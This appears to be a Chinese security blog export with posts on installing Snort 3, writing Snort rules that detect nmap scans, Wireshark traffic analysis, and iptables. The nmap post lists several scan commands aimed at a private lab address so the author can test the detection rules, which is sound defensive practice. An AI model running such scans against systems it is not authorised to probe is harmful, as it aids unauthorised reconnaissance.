安装依赖包 12sudo apt-get install -y build-essential autotools-dev libdumbnet-dev libluajit-5.1-dev libpcap-dev zlib1g-dev pkg-config libhwloc-dev cmake liblzma-dev openssl libssl-dev cpputest libsqlite3-dev libtool uuid-dev git autoconf bison flex libcmocka-dev libnetfilter-queue-dev libunwind-dev libmnl-dev ethtool 安装snort DAQ在官网下载资源包 下载并安装最新版本的 Snort DAQ（数据采集库） snort 3.0 libdaq-v3.0.8.tar.gz 上传文件到ubuntu服务器 1scp /path/local_filename username@servername:/path 安装文件上传，下载（Windows） 1apt-get install lrzsz ssh远程时，上传用rz命令，敲rz回车选你要上传的文件 下载用“sz 文件路径”回车，选保存的位置 新建一个snort专用文件夹，将以后snort的内容都放在这个文件夹 12mkdir snortSourceFilemv libdaq-3.0.8 snortSourceFile 编译安装 12cd libdaq-3.0.8./configure 报错：error: cannot find input file: &#96;api&#x2F;Makefile.in’ 12aclocalautomake --add-missing 12./bootstrap ./configure 编译成功 1sudo make &amp; make install 安装snort 3.0snort3-3.1.31.0.tar.gz 本机下载snort后，上传到服务器 1scp /path/local_filename username@servername:/path 将上传的文件解压，并移至snort文件夹 123tar -zxvf snort3-3.1.31.0.tar.gzrm -rf snort3-3.1.31.0.tar.gzmv snort3-3.1.31.0 snortSourceFile 依赖库安装 1234sudo apt-get install libpcre3-devsudo apt-get install libdumbnet-devsudo apt-get install liblua5.2-devsudo apt-get install libnghttp2-dev 设置路径 1vim ~/.bashrc 写入 1export my_path=/usr/local 设置安装路径 1source ~/.bashrc 编译 123456cd snortSourceFilecd snort3-3.1.31.0/./configure_cmake.sh --prefix=$my_pathcd buildmakesudo make install 修复链接 1sudo ldconfig 测试是否安装成功 1snort -V 用默认配置文件测试snort 1snort -c /usr/local/etc/snort/snort.lua 能够成功运行 创建用户环境12sudo groupadd snortsudo useradd snort -r -s /usr/sbin/nologin -c SNORT_IDS -g snort 参数说明： -r：创建一个系统账户 -s：用户登录后使用的shell名称（默认值不填写，这样系统会指定预设的登入shell，根据&#x2F;etc&#x2F;default&#x2F;useradd预设值）【sbin&#x2F;nologin 代表这个用户无法使用bash或其他shell来登陆系统，即使给了密码也不行，但是可以使用系统资源。只是不能登陆主机而已。】 -g：group名称【添加到snort组下】 -c：comment，注释说明栏 检查是否添加成功 检查是否添加组成功 1cat /etc/group 检查snort组下面用户是否添加成功 1id snort 创建snort目录123456sudo mkdir /etc/snortsudo mkdir /etc/snort/rulessudo mkdir /etc/snort/rules/iplistssudo mkdir /etc/snort/preproc_rulessudo mkdir /usr/local/lib/snort_dynamicrulessudo mkdir /etc/snort/so_rules 创建规则文件1234567sudo touch /etc/snort/rules/iplists/black_list.rulessudo touch /etc/snort/rules/iplists/white_list.rulessudo touch /etc/snort/rules/local.rulessudo touch /etc/snort/sid-msg.map 创建日志目录123sudo mkdir /var/log/snortsudo mkdir /var/log/snort/archived_logs 加权限123456789sudo chmod -R 775 /etc/snortsudo chmod -R 775 /var/log/snortsudo chmod -R 775 /var/log/snort/archived_logssudo chmod -R 775 /etc/snort/so_rulessudo chmod -R 775 /usr/local/lib/snort_dynamicrules 775权限： root有读、写、执行权限 组用户有读、写、执行权限 其他用户有读、执行权限 读取权限 r&#x3D;4。写入权限 w&#x3D;2。执行权限 x&#x3D;1 第一个数字 ：拥有者权限（root，文件所有者） 第二个数字 ：组用户权限（与文件所有者属于同一个用户组） 第三个数字 ：其他用户权限 修改文件所属用户及用户组12345sudo chown -R snort:snort /etc/snortsudo chown -R snort:snort /var/log/snortsudo chown -R snort:snort /usr/local/lib/snort_dynamicrules 将这些文件的所属修改为之前创建的snort组里面的snort用户 查看文件所属 ls -l &lt;file&gt; 第一列含义： ​ 第一个字母含义： ​ 第一个字母d：意味着内容是目录或文件 ​ 如果第一个是-：意味着它的内容是文件 ​ 第一个是l：意味着内容是链接文件 ​ 后面的内容是文件所属 ​ （对应着三个数字权限775） ​ 前三个字母是文件拥有者权限 ​ 中间三个是文件所有组权限 ​ 后三个是其他人访问文件的权限 第二列含义：多少链接指向这个文件 第三列含义：谁是这个文件&#x2F;文件夹的所有者 第四列含义：谁是这个文件&#x2F;文件夹所有组 第五列含义：这个文件&#x2F;文件夹的以字节为单位的大小。目录的大小总是4096字节 第六列含义：文件最后修改时间 第七列含义：文件名或目录名 附录：snort 文件部署 已经设置的安装路径 export my_path&#x3D;&#x2F;usr&#x2F;local snort安装包所在路径、相关文档 1cd /home/ubuntu/snortSourceFile doc：snort的一些说明文档所在文件夹 snort规则文件、配置文件 1cd /etc/snort snort日志文件 1cd /var/log/snort snort运行 1/usr/local/bin/snort /usr/sbin 创建守护进程【守护进程是在后台运行的进程，用于执行特定的系统任务。很多守护进程在系统引导的时候启动，并且一直运行到系统关闭。】 一个关于路径的小tips 安装路径是在 /usr/local/etc/snort ，里面存有默认的配置文件 在/etc/snort这个文件内，有和/usr/local/etc/snort相同的东西。用户在编写规则的时候，会在/etc/snort里面添加rules文件夹，进行规则编写。 所以我的理解，规则编写的逻辑是：/etc/snort 是复刻了原本安装时默认的配置，在此基础上，进行用户的规则编写。不要在原路径上去修改原配置。 不过也可能是我，不小心安装了两次，分别在不同的路径【手动狗头】 参考文章snort给出的官方安装文档：snort3-3.1.31.0&#x2F;README.md snort官网 Snort3安装和配置 Linux 上搭建 Snort+BASE 入侵检测系统 ubuntu搭建入侵检测系统","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"入侵检测/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"snort编写检测nmap扫描规则","slug":"snort编写检测nmap扫描规则","date":"2022-07-16T16:52:17.000Z","updated":"2024-11-12T06:59:20.000Z","comments":true,"path":"2022/07/17/snort编写检测nmap扫描规则/","permalink":"https://gryffinbit.top/2022/07/17/snort%E7%BC%96%E5%86%99%E6%A3%80%E6%B5%8Bnmap%E6%89%AB%E6%8F%8F%E8%A7%84%E5%88%99/","excerpt":"","text":"前言ubuntu系统配置相关Blog: 新系统的ubuntu基本配置 snort的安装跳转Blog： ubuntu【ARM架构】下安装snort2.9【虚拟机版】 ubuntu【x86架构】下搭建snort3【云服务器版】 snort的文件、规则配置跳转Blog： 配置snort以NIDS模式运行【ubuntu-ARM64】 snort定义和使用变量跳转Blog： snort定义和使用变量 环境配置Ubuntu: Ubuntu 20.04.2 ARM64 【parallel虚拟机】 macOS: macOS Monterey. M1, 2020, ARM64【物理机】 ubuntu操作用户：在parallels普通用户下进行snort部署 snort版本：snort-2.9.20 daq-2.0.7版本：daq-2.0.7 规则集版本： 29200 Tips: 注意！规则集和snort版本要对应上，因为不同版本的可能会有一些新规则不能匹配上，就不能顺利运行。参考官网，每个新版本的说明，包括规则集的说明： 规则集 版本说明 ubuntu源：中科大arm源 规则编写方式1alert&lt;keyword&gt; tcp&lt;protocol&gt; ip port -&gt; ip port (msg:&quot;&quot;; dsize:0; sid:10000004;rev:1;) keyword： alert 报警 pass 无视 log 记录 activate-报警并且激活另一条dynamic规则。 dynamic-保持空闲直到被一条activate规则激活，被激活后就作为一条log规则执行。 protocol（包协议）： TCP（传输控制协议，传输层，面向连接，可靠传输。用于提供可靠的通信服务） UDP（用户数据报协议，传输层，面向无连接，不可靠传输） ICMP（控制报文协议，网络层，面向无连接。用于传递控制消息，如网络是否畅、主机是否可达） IP IP PORT： 源IP，源PORT -&gt; IP PORT：目的IP，目标PORT （）括号里的内容是规则体： msg:&quot;&lt;message text&gt;&quot; 12345 告诉引擎和日志系统包到来时打印的信息* ``` reference:&lt;id system&gt;,&lt;id&gt;;[reference:&lt;id system&gt;,&lt;id&gt;;]; 用这个关键字来引用外部的攻击识别系统 gid:&lt;generator id&gt;; 12345 用来标识特定规则时，snort的哪部分收到了检测* ``` sid:&lt;snort rules id&gt;; 用来识别不同的规则 rev:&lt;revision integer&gt;; 12345 用来识别Snort规则的修订版* ``` flags 检查TCP flags的值。 这个规则检查tcp标志。在snort中有9个标志变量： 123456789F - FIN (LSB in TCP Flags byte)S - SYNR - RSTP - PSHA - ACKU - URG2 - Reserved bit 21 - Reserved bit 1 (MSB in TCP Flags byte)0 - No TCP Flags Set 在这些标志之间还可以使用逻辑操作符： \\+ ALL flag, 匹配所有的指定的标志外加一个标志。 \\* ANY flag, 匹配指定的任何一个标志。 ! NOT flag, 如果指定的标志不在这个数据包中就匹配成功。 保留位可以用来检测不正常行为，例如IP栈指纹攻击或者其他可疑的行为。 classtype:&lt;class name&gt;; 12345 用来作规则分类* ``` priority:&lt;priority integer&gt;; 用来标识规则的优先等级 metadata:key1 value1; 1 metadata:key1 value1, key2 value2; 12345678910111213141516171819202122232425262728293031323334353637383940414243 用键值对的形式去嵌套我们的规则## NMAP几种不同的端口扫描特点&gt; **TCP/IP中端口建立连接的原则**&gt;&gt; TCP提供可靠连接，采用三次握手建立连接，四次握手断开连接。&gt;&gt; * 三次握手建立连接&gt;&gt; ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/202207122102027.png)&gt;&gt; 1. 客户端发送SYN，请求建立连接&gt; 2. 服务器端收到SYN，发送ACK确认，同时自己发送一个SYN&gt; 3. 客户端收到ACK+SYN，回复ACK确认，连接建立完成&gt;&gt; * 四次握手断开连接&gt;&gt; ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/202207122110907.png)&gt;&gt; 1. 客户端发送FIN，请求释放连接&gt; 2. 服务器端收到FIN，发送ACK确认&gt; 3. 服务器端发送FIN，告知释放连接&gt; 4. 客户端收到FIN，发送ACK&gt;&gt; * TCP/IP遵循原则&gt;&gt; 1. 发送SYN，LISTEN端口回复ACK，CLOSE端口回复RST&gt; 2. 发送RST会被直接丢弃&gt; 3. 发送ACK给LISTEN端口，回复RST&gt; 4. 发送FIN，LISTEN端口丢弃，CLOSE端口回复RST---**NMAP全连接扫描TCP Connect scan**```shellnmap -sT 发送SYN 回复ACK则是LISTEN，回复RST是CLOSE 回复ACK 容易被察觉 半开放SYN扫描 TCP SYN Scan 1namp -sS 发送SYN 回复SYN+ACK则是LISTEN 回复RST则CLOSE 应用程序没有日志 容易被发现 以下是隐蔽扫描 ACK扫描 1nmap -sA 发送ACK LISTEN端口回复RST CLOSE端口丢弃 FIN扫描 1nmap -sF 发送FIN LISTEN端口丢弃 CLOSE端口回复RST 扫描效率低，需要等待超时 TCP Xmas扫描（同FIN） 1nmap -sX 发送FIN+URG+PSH LISTEN端口丢弃 CLOSE端口回复RST 扫描效率低，需要等待超时，不能适用所有系统 TCP NULL扫描（同FIN） 1nmap -sN 发送NULL LISEN端口丢弃 CLOSE端口回复RST 扫描效率低，需要等待超时，不能适用所有系统 UDP扫描 1nmap -sU 发送UDP包 返回ICMP_PORT_UNREACH为关闭，否则打开 不可靠 目标可以禁止UDP 检测NMAP扫描编写规则 在ip部分填写安装snort机器的ip 1sudo vim /etc/snort/rules/local.rules 1234567891011121314151617181920# NMAP Ping扫描alert icmp any any -&gt; 192.168.1.6 any (msg: &quot;NMAP ping sweep Scan&quot;; dsize:0;sid:10000001; rev: 1;)# NMAP TCP扫描#（能够检测到攻击使用nmap的端口爆破、连接及漏洞利用行为）alert tcp any any -&gt; 192.168.1.6 any (msg: &quot;NMAP TCP Scan&quot;;sid:10000002;rev:2;)# NMAP UDP扫描#（能够检测到攻击使用nmap的端口爆破、连接及漏洞利用行为） alert udp any any -&gt; 192.168.1.6 any ( msg:&quot;Nmap UDP Scan&quot;; sid:10000003; rev:1; )# NMAP XMAS扫描# 有时攻击者不适用 TCP 通讯进行扫描，而使用 XMAS 通过 Fin、PSH和URG发送数据包进行扫描alert tcp any any -&gt; 192.168.1.6 any (msg:&quot;Nmap XMAS Tree Scan&quot;; flags:FPU; sid:1000004; rev:1; )# 检测FIn扫描alert tcp any any -&gt; 192.168.1.6 any (msg:&quot;Nmap FIN Scan&quot;; flags:F; sid:1000005; rev:1;)# 检测NULL扫描alert tcp any any -&gt; 192.168.1.6 any (msg:&quot;Nmap NULL Scan&quot;; flags:0; sid:1000006; rev:1; ) TCP flags的值 F - FIN (LSB in TCP Flags byte)S - SYNR - RSTP - PSHA - ACKU - URG2 - Reserved bit 21 - Reserved bit 1 (MSB in TCP Flags byte)0 - No TCP Flags Set 规则检测 snort虚拟机，开启检测模式 1snort -i eth0 -c /etc/snort/snort.conf -A fast -l /var/log/snort/ 物理机，进行攻击 -p1-200 只扫描1-200端口号 1234567891011121314151617# Pingnmap -sP 192.168.1.6 --disable-arp-ping# TCPnmap -sT -p1-200 192.168.1.6# UDPnmap -sU -p1-200 192.168.1.6# XMASnmap -sX -p1-200 192.168.1.6# FINnmap -sF -p1-200 192.168.1.6# NULLnmap -sN -p1-200 192.168.1.6 在日志中查看检测结果 12345cd /var/log/snortcat alert# 或者可以查看日志sudo snort -r snort.log.xxx# 或者可以wireshark查看 ​ 参考文章检测NAMP扫描 nmap扫描端口常用的几种扫描模式","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"入侵检测/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"nmap","slug":"nmap","permalink":"https://gryffinbit.top/tags/nmap/"},{"name":"snort规则","slug":"snort规则","permalink":"https://gryffinbit.top/tags/snort%E8%A7%84%E5%88%99/"}],"author":"Gryffinbit"},{"title":"wireshark网络分析的艺术笔记【工作中的Wireshark】","slug":"wireshark网络分析的艺术笔记【工作中的Wireshark】","date":"2022-07-15T15:37:18.000Z","updated":"2024-11-12T06:58:23.000Z","comments":true,"path":"2022/07/15/wireshark网络分析的艺术笔记【工作中的Wireshark】/","permalink":"https://gryffinbit.top/2022/07/15/wireshark%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90%E7%9A%84%E8%89%BA%E6%9C%AF%E7%AC%94%E8%AE%B0%E3%80%90%E5%B7%A5%E4%BD%9C%E4%B8%AD%E7%9A%84Wireshark%E3%80%91/","excerpt":"","text":"wireshark抓取包，理想和现实理想中的TCP传输：客户端每传两个数据包，服务器就立即Ack一下表示已经收到。 然而这只是从数据接收方的角度所看到的。但实际上网络存在延迟，ack包到达客户端时会之后，可能会存在客户端发完6号包才收到ACK3。 所以抓包时可以尽量两边同时抓包，对照着看。 计算“在途字节数” 在途字节数：网络承载量，可以用已经发送出去，但尚未被确认的字节数来表示。在途字节数如果超过网络的承载能力，就会丢包重传 理想情况：网络上只有一个TCP连接在通信，可以通过带宽和延迟来计算最多能承载多少在途字节数。 实际环境： ​ 同一条网络路径是由多台主机之间共享的，根本不知道多少比例的带宽是分配给某个TCP连接。 使用Wireshark分析： 1在途字节数=seq+len-ack ​ seq和len是来自上一个数据发送方的包，ack来自上一个数据接收方的包。【在数据发送方抓到的包，才能用来分析在途字节数】 估算网络拥塞点 网络拥塞点：当发送方一口气向网络中注入大量数据时，就可能超过该网络的承受能力而导致拥塞，这个足以触发拥塞的数据量就称为拥塞点 发生拥塞时的在途字节数即是该时刻的网络拥塞点。估算拥塞点可以简化成：找出拥塞时刻的在途字节数 拥塞的特征是连串丢包，丢包之后就会重传，而 Wireshark 是能够标识出重传包的。 寻找拥塞时刻步骤：先从Wireshark中找到一连串重传包中的第一个，在根据该重传包的seq值找到其原始包，最后计算该原始包发送时刻的在途字节数。 在wireshark上单击analyze菜单，选择expert info选项，找到重传统计表 点击第一个重传包No.1225.可见它的seq&#x3D;1012852.于是用tcp.seq==1012852作为过滤条件 点击apply过滤之后得到了原始包No.1053 选定1053 号包，然后点击Clear 清除过滤。可见上一个来自服务器端的包是1051 号包。 利用上文计算“在途字节数”的公式，可知当时的在途字节数为1012852（No.1053 的Seq）+816（No.1053 的Len）− 910546（No.1051 Ack）&#x3D;103122字节。 最好多次采样，然后选定一个合适的值作为该连接的拥塞点（不应该取平均值，而应该取一个偏小的）。 LSOLSO 是什么呢?它是为了拯救 CPU 而出现的一个创意。随着网络进入千兆和万兆时代，CPU的工作负担明显加重了。625MB&#x2F;s 的网络流量大约需要耗费5 GHz 的CPU，这已经需要一个双核2.5 GHz CPU的全部处理能力了。为了缓解CPU 的压力，最好把它的一些工作外包(offload)给网卡，比如 TCP 的分段工作。 传统的网络工作方式是这样的:应用层把产生的数据交给 TCP 层，TCP 层再 根据 MSS 大小进行分段(由 CPU 负责)，然后再交给网卡。而启用 LSO 之后， TCP 层就可以把大于 MSS 的数据块直接传给网卡，让网卡来负责分段工作了。 比如本例子中的“Seq&#x3D;348586，Len&#x3D;2776”，最后会被网卡分成“Seq&#x3D;348586，Len&#x3D;1388”和“Seq&#x3D;349974，Len&#x3D;1388”两个包。由于在发送方抓包时相当于 站在 CPU 的视角，所以看到的是一个分段前的大包。假如是在接收方抓包，就是 网卡分段后的两个小包了。本文用到的这个例子还是比较小的数据块，我还经常抓到比这个大十倍以上的。 熟读RFC RFC(Request For Comments)-意即“请求注解”，包含了关于Internet的几乎所有重要的文字资料 Question：丢包不多，RTT 也很稳定，但数据却传不快。怎么回事 Answer：初步猜测是客户端的 TCP 发送窗口太小。决定客户端发送窗口的因素有两个，分别为网络上的拥塞窗口(Congestion Window，缩写为 cwnd)和服务器上的接收窗口。 cwnd的增长方式 选中一个发送窗口 中最后的那个包，就可以看到它的“Bytes in flight”，它在本案例中就代表了 cwnd 的大小。我随机选中了 1970 号包，从图 4 可见其 cwnd 为 76020。根据图 3 的理 论，如果当时处于“拥塞避免”阶段，那下一个 cwnd 应该就是 76020 加上一个 MSS(以太网中大概为 1460 字节)，变成 77480。如果是在慢启动阶段，那就远 远不止这么大。 然而再看下图，Wireshark中却显示下一个RTT(1974号包)的cwnd为76215。 也就是说经历了一个 RTT 之后才增加了 195 个字节，远不如我们所期望的。我接 着又往下看了几个 RTT，还是一样的情况。这意味着客户端的发送窗口增长非常 慢，所以传输效率就很低。 cwnd的一种计算方式： 假如客户端的当前 cwnd 大小为 n 个 MSS，它就会在一个窗口里发出去 n 个包，然后期望收到 n 个 Ack。每收到 1 个 Ack 它就把 cwnd 增加“MSSMSS&#x2F;cwnd”，于是收到 n 个 Ack 之后就总共增加了“MSS(nMSS&#x2F;cwnd)”。由于 cwnd 等于 n 个 MSS，所以括号 里的(nMSS&#x2F;cwnd)大约等于 1，从而实现了每经过 1 个 RTT 就增加 1 个 MSS 的 目的。 所以是cwnd增长过慢导致的，因为只有收到n个ack后才会按照预期的速度增长。但并非所有服务器都是收到n个数据包就回复n个ack的。服务器的网卡上启用了 Large Receive Offload(LRO)， 会积累多个 TCP 包再集中处理，因此 Ack 数就比别的服务器少很多，这也解释了为什么其他服务 器没有性能问题。后来系统管理员用 ethtool 命令关闭 LRO 就把问题解决掉了。 错误使用UDP协议传输UDP时不可靠传输，它缺乏一个机制确保数据安全送达。它不能把大数据块先进行分段，所以很容易被网络层分片，但一个分片的丢失，会导致所有分片都被重传一遍，效率极低。所以在传输大数据的时候，需要使用TCP来进行传输。 关于分片的几个问题Question1：为什么要分片 Answer1：由于电路交换的双方要独占链路，所以利用率很低，直到后来发明了分组交换的概念，把数据分割成小包后才实现了链路共享。现在的以太网中，以1500字节作为最大传输单位，即MTU&#x3D;1500。刨去 20 字节的头部，一个 IP 包最多可以携带 1500-20&#x3D;1480 字节 的数据。当要传输的数据块超过 1480 字节时，网络层就不得不把它分片，封装成多个网络包。 Question2：发送方是怎样确定分片大小的？ Answer2：一般来说，发送方是依据自身的MTU来决定分片大小的。总而言之，目前发送方没有一个很好的机制来确定最佳分片大小，所以实施和运维人员配置MTU时必须谨慎，尽量使网络中每个设备的MTU保持一致 Question3：接收方又是靠什么重组分片的？ Answer 3 ：依据off（偏移量）和ID两个值。把ID相同的分片，按照off（偏移量）进行重组。当收到一个包，它包含more fragments = 0的flag，则表示它是最后一个分片，接收方可以开始重组了。 Question 4 ：TCP是如何避免被发送方分片的？ Answer 4 ：TCP可以避免被发送方分片，是因为它主动把数据分成小段再交给网络层。最大的分段大小称为MSS，它相当于把MTU除去IP头和TCP头之后的大小，所以一个MSS恰好能装进一个MTU中。 UDP则没有MSS的概念，一股脑交给网络层，所以可能被分片。分片和重组都会影响性能，所以UDP在这一点上比TCP落后一些。 Question 5 ：TCP是怎样适配接收方的MTU的 Answer 5 ： TCP建立连接时必须先进行三次握手，在前两个握手包中双方互相声明了自己的MSS","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"流量分析","slug":"Web安全/流量分析","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"wireshark","slug":"wireshark","permalink":"https://gryffinbit.top/tags/wireshark/"}],"author":"Gryffinbit"},{"title":"iptables介绍","slug":"iptables介绍","date":"2022-07-14T13:41:49.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/07/14/iptables介绍/","permalink":"https://gryffinbit.top/2022/07/14/iptables%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"简介Linux下的包过滤防火墙。可以完成封包过滤、封包重定向和网络地址转换（NAT）等功能。 规则 规则定义为：如果数据包头符合这样的条件，就这样处理这个数据包。 规则存储在内核空间的信息包过滤表中。这些规则分别指定了源地址、目的地址、传输协议和服务类型等。等数据包与规则匹配时，iptables就根据规则所定义的方法来处理数据包：accept、reject、drop iptables是Linux防火墙的管理工具，位于sbin/iptables，实现防火墙功能的是netfilter，它是Linux内核中实现包过滤的内部结构。 iptables传输数据包的过程 数据包进入网卡，进入prerouting链，根据数据包目的ip【判断是否需要传送出去】 数据包是进入本机的，到达input链。到达input链后，任何进程都会收到它。【本机上运行的程序可以发送数据包】，这些数据包会经过output链，【到达postrouting链输出】】 数据包如果是要转发，会经过forward链，到达postrouting链输出。 iptables的规则表和链四个内置表：filter（包过滤）、nat（网路地址转换）、mangle（包重构、修改）、raw（数据跟踪处理） 表的优先顺序: raw &gt; mangle &gt; nat &gt; filter 链：数据包传播的路径，每一条链就是众多规则中的一个检测清单。每一条链中可以有一条或数条规则。当一个数据包到达一个链时，iptables就会从链中第一条规则开始检查。满足，则按规定定义的方法处理包。不满足就检查下一条规则。如果数据包不满足链中任何一条规则，则会根据预定义的默认规则处理。 表对应的链： filter表：input链、forward链、output链。 ​ 作用过滤数据包。内核模块：iptables_filter NAT表：prerouting链、postrouting链、output链 ​ 作用：网络地址转换（IP、端口）。内核模块：iptable_nat mangle表：prerouting、postrouting、input、output、forward ​ 作用：修改数据包的服务类型、TTL、并且可以配置路由实现QOS（服务质量，网络为特定流量提供更高优先服务的同时控制抖动和延迟的能力，并且能够降低数据传输丢包率）。 内核模块：iptable_mangle raw表：output、prerouting ​ 作用：决定数据包是否被状态跟踪机制处理。 内核模块: iptable_raw 规则链1.INPUT——进来的数据包应用此规则链中的策略 2.OUTPUT——外出的数据包应用此规则链中的策略 3.FORWARD——转发数据包时应用此规则链中的策略 4.PREROUTING——对数据包作路由选择前应用此链中的规则 （记住！所有的数据包进来的时侯都先由这个链处理） 5.POSTROUTING——对数据包作路由选择后应用此链中的规则 （所有的数据包出来的时侯都先由这个链处理） 数据流向入站数据流向 先被prerouting规则链处理、然后路由选择。 数据包目标主机是防火墙本机，则传给input链处理。（比如网络用户访问防火墙主机中的web服务） 通过后，交给系统上层应用程序进行响应（比如交给apache服务器） 转发数据流向 先被prerouting规则链处理、然后路由选择。 数据包目标地址是其他外部网络，则传给forward链处理（比如局域网用户通过网关访问QQ站点的数据包）（处理：转发或拦截） 交给postrouting规则链，进行处理（是否修改数据包的地址等） 出站数据流向 防火墙本机向外部地址发数据包，先被output链处理（比如防火墙主机测试公网DNS服务器时） 然后路由选择 最后传递给postrouting链 参考文章iptables详解以及常用规则","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"iptables","slug":"入侵检测/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"}],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"}],"author":"Gryffinbit"},{"title":"wireshark网络分析的艺术笔记【答读者问】","slug":"wireshark网络分析的艺术笔记【答读者问】","date":"2022-07-13T22:22:07.000Z","updated":"2024-11-12T06:59:02.000Z","comments":true,"path":"2022/07/14/wireshark网络分析的艺术笔记【答读者问】/","permalink":"https://gryffinbit.top/2022/07/14/wireshark%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90%E7%9A%84%E8%89%BA%E6%9C%AF%E7%AC%94%E8%AE%B0%E3%80%90%E7%AD%94%E8%AF%BB%E8%80%85%E9%97%AE%E3%80%91/","excerpt":"","text":"Linux为什么卡住了Question：有时通过SSH 登录 Linux 服务器时，输完用户名就卡住了，要等待10秒钟才提示密码输入。 Answer：Linux 服务器在收到 SSH 访问请求时，会先查询该客户端 IP 所对应的 PTR 记录。假如经过 5 秒钟还没有收到回复，就再发一次查询。如果第二次查询还是等了 5 秒还没复，就彻底放弃查询。如果DNS 查询能成功，就不用白等那10 秒钟了。 PTR记录：域名系统 (DNS) 将域名与 IP 地址相关联。DNS 指针记录（简称 PTR）提供与 IP 地址关联的域名。DNS PTR 记录与“A”记录完全相反，它提供与域名关联的 IP 地址。DNS PTR 记录用于反向 DNS 查找。当用户尝试在其浏览器中访问域名时，会进行 DNS 查找，将域名与 IP 地址相匹配。反向 DNS 查找与此过程相反：它是以 IP 地址开始并查找域名的查询。 Solution：针对这个问题，解决方法是更改ssh配置文件，将UseDNS配置项关闭（UseDNS no） VMware优化存储阵列和读写性能Question：某些iSCSI 存储阵列在出现网络拥塞时处理不当，会严重影响VMware 的读写性能 Answer：这和它们的TCP 实现方式有关。延迟确认会在收到数据包时，不直接发出确认包而是等待一段时间，并且将这段时间的确认包作为捎带确认数据一并发送。这样的话，便将原来多个数据包合并到一个数据包发送了，减少了数据包的发送，节省了数据包数量。但如果多个延迟确认拥塞在一起，就会出现较长等待时间，影响性能。 SCSI是小型计算机系统接口(Small Computer System Interface)的简称，SCSI作为输入&#x2F;输出接口，主要用于硬盘、光盘、磁带机、扫描仪、打印机等设备。iSCSI就是在IP网络上运行SCSI协议的一种网络存储技术 Solution：VMware通过关闭延迟确认，可以优化ISCSI存储阵列和VMware的读写性能。 wireshark中三次握手 wireshark中，在Edit/Preferences/Protocols/TCP 菜单中勾上 Relative Sequence Numbers ，以此来启用序号相对值，便于观察TCP三次握手时需要的Seq值和ACK值。 成功的握手都是一样的，失败的握手却各有不同，因此解决起来还是需要一 些技巧的。握手失败一般分两种类型，要么被拒绝，要么是丢包了。作者提到使用下面两个过滤表达式便可以定位出大多数握手失败的数据包： 表达式 1：(tcp.flags.reset == 1) &amp;&amp; (tcp.seq == 1)，表示握手请求被对方拒绝了。 表面上看，其只是过滤出 Seq 号为 1，且含有 Reset 标志的包。但在启用Relative Sequence Numbers 的情况下，这往往表示握手请求被对方拒绝了。接下来只需右键选中过滤出的包，再点击Follow TCP Stream 就可以把失败的全过程显示出来。 表达式 2：(tcp.flags.syn == 1) &amp;&amp; (tcp.analysis.retransmission)，可过滤出重传的握手请求。 一个握手请求之所以要重传，往往是因为对方没收到，或者对方回复的确认包丢失了。过滤之后，再右键点击过滤出的包，再用Follow TCP Stream 就可以把失败过程显示出来。 三次握手建立连接： 客户端发送SYN，请求建立连接【SYN&#x3D;1，ACK&#x3D;0】 服务器端收到SYN，发送ACK确认，同时自己发送一个SYN【SYN&#x3D;1，ACK&#x3D;1】 客户端收到ACK+SYN，回复ACK确认，连接建立完成【SYN&#x3D;0，ACK&#x3D;1】 四次握手断开连接： 客户端发送FIN，请求释放连接【FIN】 服务器端收到FIN，发送ACK确认【ACK】 服务器端发送FIN，告知释放连接【FIN】 客户端收到FIN，发送ACK【ACK】 TCP标志位 SYN：同步标志位，用于2台主机要建立连接时，第一次发出的数据包，在TCP三次握手中，前两次握手会带有SYN标志位，如上图的TCP三次握手。 ACK：确认位，用于说明前对方发过来的数据包成功收到，上图中可以看到，第二次握手时，Receiver发送的包里面带有ACK和SYN，ACK是告诉Sender，刚刚你发过来的SYN包，我已经收到了。 FIN：发送方发送FIN标志位，目的是告诉接收者，这是最后一个包了。 URG：urgent flag用于通知receiver进程这个包要优先处理，把其他包先放一边。 PSH：push flag功能也urgent一样，优先处理，只是带有这个标志位的包程序直接处理，不进入接收缓存中。 RST：reset flag是从receiver发送到sender的包中才有，表明需要重连。需要复位。 ECE：ECN响应标志被用来在TCP3次握手时表明一个TCP端是具备ECN功能的，并且表明接收到的TCP包的IP头部的ECN被设置为11。 CWR：拥塞窗口减少标志被发送主机设置，用来表明它接收到了设置ECE标志的TCP包。拥塞窗口是被TCP维护的一个内部变量，用来管理发送窗口大小。 NS：（experimental）还在试验中。 tcp.flags.reset &#x3D;&#x3D; 1 需要重连，复位 基于三次握手的SYN flood 原理：从大量主机发送SYN请求给服务器，假装要建立TCP连接。这些SYN请求可能含有假的源地址，所以服务器响应后永远收不到ACK，就会留下half-open状态的TCP连接。由于每个TCP连接都会消耗一定的系统资源，如果攻击足够猛烈，此类连接建立越多，服务器的资源就会被耗光，真正的用户访问也会被拒绝 Solution：如果干扰包太多，点击Analyze/Expert 